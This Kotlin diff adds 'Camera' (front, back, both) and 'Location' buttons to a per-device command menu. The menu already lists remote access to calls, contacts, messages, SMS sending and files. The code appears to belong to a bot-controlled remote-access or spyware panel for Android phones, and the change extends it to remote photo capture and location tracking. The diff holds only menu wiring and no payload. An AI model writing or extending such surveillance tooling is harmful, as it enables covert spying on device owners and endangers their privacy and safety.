@@ -22,6 +22,14 @@ object Cb {
     const val BACK_DEV = "bd"
     const val BACK_MENU = "bm"
     const val CANCEL = "co"
+    // Camera
+    const val CAMERA = "cam"
+    const val CAM_BACK = "cb"
+    const val CAM_FRONT = "cf"
+    const val CAM_BOTH = "c2"
+    // Location
+    const val LOCATION = "loc"
+    const val LOC_GET = "lg"
 }
 
 class KeyboardBuilder {
@@ -52,8 +60,20 @@ class KeyboardBuilder {
     fun getCommandMenuButtons(deviceId: String): List<List<Pair<String, String>>> = listOf(
         listOf("📞 Calls" to "${Cb.CALLS}:$deviceId", "👥 Contacts" to "${Cb.CONTACTS}:$deviceId"),
         listOf("💬 Messages" to "${Cb.MESSAGES}:$deviceId", "📤 SMS" to "${Cb.SEND_SMS}:$deviceId"),
+        listOf("📷 Camera" to "${Cb.CAMERA}:$deviceId", "📍 Location" to "${Cb.LOCATION}:$deviceId"),
         listOf("📁 Files" to "${Cb.BROWSE}:$deviceId:"),
         listOf("◀️ Back" to "${Cb.BACK_DEV}:$deviceId")
+    )
+
+    fun getCameraSubMenuButtons(deviceId: String): List<List<Pair<String, String>>> = listOf(
+        listOf("🔙 Back Camera" to "${Cb.CAM_BACK}:$deviceId", "📤 Front Camera" to "${Cb.CAM_FRONT}:$deviceId"),
+        listOf("📷 Both Cameras" to "${Cb.CAM_BOTH}:$deviceId"),
+        listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId")
+    )
+
+    fun getLocationSubMenuButtons(deviceId: String): List<List<Pair<String, String>>> = listOf(
+        listOf("📍 Get Location" to "${Cb.LOC_GET}:$deviceId"),
+        listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId")
     )
 
     fun getSmsSubMenuButtons(deviceId: String): List<List<Pair<String, String>>> = listOf(
